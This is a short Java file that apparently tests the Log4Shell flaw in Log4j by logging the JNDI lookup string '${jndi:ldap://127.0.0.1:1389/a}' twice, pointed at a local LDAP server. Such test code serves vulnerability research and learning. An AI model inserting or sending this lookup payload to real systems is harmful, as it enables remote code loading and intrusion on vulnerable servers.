import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;


public class Log4j {
    private static final Logger logger = LogManager.getLogger(Log4j.class);

    public static void main(String[] args) {
        // exploit will be executed
        logger.error("${jndi:ldap://127.0.0.1:1389/a}");
        // no more exploits will be executed from here TBD - try with another file
        logger.error("${jndi:ldap://127.0.0.1:1389/a}");
    }
}
